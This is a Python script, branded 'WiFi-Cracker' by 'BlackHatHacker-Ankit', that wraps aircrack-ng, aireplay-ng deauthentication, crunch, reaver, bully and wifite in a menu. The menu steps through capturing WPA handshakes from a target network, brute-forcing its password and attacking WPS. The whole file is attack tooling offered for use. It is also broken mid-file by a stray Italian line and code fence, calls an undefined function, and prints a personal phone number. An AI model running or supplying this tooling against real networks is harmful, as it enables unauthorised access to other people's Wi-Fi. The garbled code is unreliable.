# coding: utf-8
#!/usr/bin/env python

import os
import subprocess

class WirelessTool:
    def __init__(self):
        self.interface = ""
        self.path = ""
        self.essid = ""
    
    def install_tools(self):
        tools = [
            "aircrack-ng", "crunch", "xterm", "wordlists", "reaver",
            "pixiewps", "bully", "wifite", "kalibrate-rtl", "KillerBee",
            "Kismet", "mdk3", "mfcuk", "mfoc", "mfterm", "multimon-NG",
            "RTLSDR Scanner", "Spooftooph", "Wifi Honey", "gr-scan"
        ]
        for tool in tools:
            cmd = f"apt-get install {tool}"
            subprocess.check_call(cmd.split())
    
    def start_monitor_mode(self):
        self.interface = input("Enter the interface (Default: wlan0/wlan1): ")
        cmd = f"airmon-ng start {self.interface} && airmon-ng check kill"
        subprocess.check_call(cmd, shell=True)
        self.intro()
    
    def stop_monitor_mode(self):
        self.interface = input("Enter the interface (Default: wlan0mon/wlan1mon): ")
        cmd = f"airmon-ng stop {self.interface} && service network-manager restart"
        subprocess.check_call(cmd, shell=True)
        self.intro()
    
    def scan_networks(self):
        self.interface = input("Enter the interface (Default: wlan0mon/wlan1mon): ")
        cmd = f"airodump-ng {self.interface} -M"
        print("When Done Press CTRL+C")
        subprocess.call("sleep 3", shell=True)
        subprocess.call(cmd, shell=True)
        subprocess.call("sleep 10", shell=True)
        self.intro()
    
    def get_handshake(self):
        self.interface = input("Enter the interface (Default: wlan0mon/wlan1mon): ")
        cmd = f"airodump-ng {self.interface} -M"
        print("When Done Press CTRL+C")
        print("Note: Under Probe it might be Passwords. Copy them to the wordlist file.")
        print("Don't Attack The Network if its Data is ZERO (you waste your time).")
        print("You can use 's' to arrange networks.")
        subprocess.call("sleep 7", shell=True)
        subprocess.call(cmd, shell=True)
        self.bssid = input("Enter the bssid of the target: ")
        self.channel = int(input("Enter the channel of the network: "))
        self.path = input("Enter the path of the output file: ")
        self.dist = int(input("Enter the number of packets [1-10000] (0 for unlimited number): "))
        order = f"airodump-ng {self.interface} --bssid {self.bssid} -c {self.channel} -w {self.path} | xterm -e aireplay-ng -0 {self.dist} -a {self.bssid} {self.interface}"
        subprocess.call(order, shell=True)
        self.intro()
    
    def create_wordlist(self):
        self.mini = int(input("Enter the minimum length of the password (8/64): "))
        self.max = int(input("Enter the maximum length of the password (8/64): "))
        self.path = input("Enter the path of the output file: ")
        self.password = input("Enter what you want the password to contain: ")
        order = f"crunch {self.mini} {self.max} {self.password} -o {self.path}"
        subprocess.call(order, shell=True)
        print(f"The wordlist is saved in {self.path}")
        self.intro()
    
    def crack_handshake_rockyou(self):
        if os.path.exists("/usr/share/wordlists/rockyou.txt"):
            self.path = input("Enter the path of the handshake file: ")
            order = f"aircrack-ng {self.path} -w /usr/share/wordlists/rockyou.txt"
            print("To exit, press CTRL+C")
            subprocess.call(order, shell=True)
            subprocess.call("sleep 3d", shell=True)
        else:
            cmd = "gzip -d /usr/share/wordlists/rockyou.txt.gz"
            subprocess.call(cmd, shell=True)
            self.path = input("Enter the path of the handshake file: ")
            order = f"aircrack-ng {self.path} -w /usr/share/wordlists/rockyou.txt"
            print("To exit, press CTRL+C")
            subprocess.call(order, shell=True)
            subprocess.call("sleep 3d", shell=True)
        exit()
    
    def crack_handshake_wordlist(self):
        self.path = input("Enter the path of the handshake file: ")
        self.wordlist = input("Enter the path of the wordlist: ")
        order = f"aircrack-ng {self.path} -w {self.wordlist}"
        subprocess.call(order, shell=True)
        exit()
    
    def crack_handshake_without_wordlist(self):
        self.essid = input("Enter the essid of the network: ")
        self.path = input("Enter the path of the handshake file: ")
        self.mini = int(input("Enter the minimum length of the password (8/64): "))
        self.max = int(input("Enter the maximum length of the password (8/64): "))
        print("1) Lowercase chars (abcdefghijklmnopqrstuvwxyz)")
        print("2) Uppercase chars (ABCDEFGHIJKLMNOPQRSTUVWXYZ)")
        print("3) Numeric chars (0123456789)")
        print("4) Symbol chars (!#$%/=?{}[]-*:;)")
        print("5) Lowercase + uppercase chars (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ)")
        print("6) Lowercase + numeric chars (abcdefghijklmnopqrstuvwxyz0123456789)")
        print("7) Uppercase + numeric chars (ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789)")
        print("8) Symbol + numeric chars (!#$%/=?{}[]-*:;0123456789)")
        print("9) Lowercase + uppercase + numeric chars (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789)")
        print("10) Lowercase + uppercase + symbol chars (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%/=?{}[]-*:;)")
        print("11) Lowercase + uppercase + numeric + symbol chars (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%/=?{}[]-*:;)")
        print("12) Your Own Words and numbers")
        choice = input("Enter your choice: ")
        if choice == "1":
            test = "abcdefghijklmnopqrstuvwxyz"
        elif choice == "2":
            test = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        elif choice == "3":
            test = "0123456789"
        elif choice == "4":
            test = "!#$%/=?{}[]-*:;"
        elif choice == "5":
            test = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        elif choice == "6":
            test = "abcdefghijklmnopqrstuvwxyz0123456789"
        elif choice == "7":
            test = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        elif choice == "8":
            test = "!#$%/=?{}[]-*:;0123456789"
        elif choice == "9":
Continuazione del codice riscritto:

```python
            test = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        elif choice == "10":
            test = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%/=?{}[]-*:;"
        elif choice == "11":
            test = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%/=?{}[]-*:;"
        elif choice == "12":
            test = input("Enter your own words and numbers: ")
        else:
            print("Invalid choice")
            self.intro()
            return
        order = f"crunch {self.mini} {self.max} {test} | aircrack-ng {self.path} -e {self.essid} -w-"
        subprocess.call(order, shell=True)
        print("Copy the Password and Close the tool")
        subprocess.call("sleep 3d", shell=True)
    
    def wps_network_attacks(self):
        print("1) Reaver")
        print("2) Bully")
        print("3) Wifite (Recommended)")
        print("4) PixieWps")
        print("0) Back to Main Menu")
        choice = int(input("Choose the kind of the attack: "))
        if choice == 1:
            self.interface = input("Enter the interface to start (Default: wlan0mon/wlan1mon): ")
            self.bssid = input("Enter the bssid of the network: ")
            order = f"reaver -i {self.interface} -b {self.bssid} -vv"
            subprocess.call(order, shell=True)
            self.intro()
        elif choice == 2:
            self.interface = input("Enter the interface to start (Default: wlan0mon/wlan1mon): ")
            self.bssid = input("Enter the bssid of the network: ")
            self.channel = int(input("Enter the channel of the network: "))
            order = f"bully -b {self.bssid} -c {self.channel} --pixiewps {self.interface}"
            subprocess.call(order, shell=True)
            self.intro()
        elif choice == 3:
            subprocess.call("wifite", shell=True)
            self.intro()
        elif choice == 4:
            self.interface = input("Enter the interface to start (Default: wlan0mon/wlan1mon): ")
            self.bssid = input("Enter the bssid of the network: ")
            order = f"reaver -i {self.interface} -b {self.bssid} -K"
            subprocess.call(order, shell=True)
            self.intro()
        elif choice == 0:
            self.intro()
    
    def about_me(self):
        print("""
Hi.
My Name is 4nk17, A Ethical Hacker,Bug Bounty Hunter,Currently Working as Cyber Security Researcher.
you can find on Instagram

https://www.instagram.com/ankit_kanojiya57/

Contact me +919768367597

Feel Free to Contact,
""")
        quit()
    
    def intro(self):
        subprocess.call("clear", shell=True)
        print("""
---------------------------------------------------------------------------------------
██╗    ██╗██╗███████╗██╗       ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ 
██║    ██║██║██╔════╝██║      ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║ █╗ ██║██║█████╗  ██║█████╗██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝
██║███╗██║██║██╔══╝  ██║╚════╝██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
╚███╔███╔╝██║██║     ██║      ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                        Coded By BlackHatHacker-Ankit
---------------------------------------------------------------------------------------                                                                     
(1) Start monitor mode       
(2) Stop monitor mode                        
(3) Scan Networks                            
(4) Getting Handshake (monitor mode needed)   
(5) Install Wireless tools                   
(6) Crack Handshake with rockyou.txt (Handshake needed)
(7) Crack Handshake with wordlist (Handshake needed)
(8) Crack Handshake without wordlist (Handshake, essid needed)
(9) Create wordlist                                     
(10) WPS Networks attacks (Bssid, monitor mode needed)
(11) Scan for WPS Networks

(0) About Me
(00) Exit
-----------------------------------------------------------------------
""")
        choice = input("Enter your choice here: ")
        if choice == "1":
            self.start_monitor_mode()
        elif choice == "2":
            self.stop_monitor_mode()
        elif choice == "3":
            self.scan_networks()
        elif choice == "4":
            self.get_handshake()
        elif choice == "5":
            self.install_tools()
            self.intro()
        elif choice == "6":
            self.crack_handshake_rockyou()
        elif choice == "7":
            self.crack_handshake_wordlist()
        elif choice == "8":
            self.crack_handshake_without_wordlist()
        elif choice == "9":
            self.create_wordlist()
        elif choice == "10":
            self.wps_network_attacks()
        elif choice == "11":
            self.scan_wps_networks()
        elif choice == "0":
            self.about_me()
        elif choice == "00":
            exit()
        else:
            print("Not Found")
            subprocess.call("sleep 2", shell=True)
            self.intro()


if __name__ == "__main__":
    tool = WirelessTool()
    tool.intro()
